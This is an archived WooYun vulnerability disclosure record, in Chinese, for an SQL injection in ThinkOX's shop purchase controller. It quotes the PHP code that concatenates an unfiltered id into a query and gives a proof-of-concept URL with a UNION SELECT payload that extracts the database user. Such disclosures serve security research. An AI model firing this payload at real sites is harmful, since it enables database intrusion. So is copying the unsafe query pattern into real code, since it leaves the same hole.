{"id": 41834, "wybug_id": "wooyun-2014-087530", "wybug_title": "ThinkOX 最新版 SQL 注入漏洞 #4", "wybug_corp": "ThinkOX", "wybug_author": "Ricter", "wybug_date": "2014-12-22 10:11", "wybug_open_date": "2015-03-22 10:12", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-22：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： ThinkOX 参数过滤不严格导致 SQL 注入漏洞。 详细说明：  /Application/Shop/Controller/IndexController.class.php\n/**     * 购买商品     * @param int $id     * @param int $num     * @author 郑钟良<zzl@ourstu.com>     */    public function goodsBuy($id = 0, $name = '', $address = '', $zipcode = '', $phone = '', $address_id = '')    {        $address = op_t($address);        $address_id = intval($address_id);        $num = 1;        if (!is_login()) {            $this->error('请先登录！');        }        $goods = D('shop')->where('id=' . $id)->find();        if ($goods) {            if($num<=0){                $this->error('商品购买数量不能为负数。');            }            //验证开始            //判断商品余量            if ($num > $goods['goods_num']) {                $this->error('商品余量不足');            }            //扣tox_money            $tox_money_need = $num * $goods['tox_money_need'];            $my_tox_money = getMyToxMoney();\n商品的id未经过过滤，并且用拼接的方式带入where查询，导致注入。_(:з」∠)_为什么address和address_id过滤了id却不过滤呢。。   漏洞证明：  用户登录后访问地址：\nhttp://10.211.55.3/thinkox/index.php?s=/shop/index/goodsBuy/name/%E5%95%8A/address/a/zipcode/123456/phone/13322222222/id/1)union%20select%201,user(),3,4,5,-9999,7,8,9,10,11,12,13%23.html\n然后再访问：\nhttp://10.211.55.3/thinkox/index.php?s=/usercenter/public/getinformation.html\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 Ricter@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}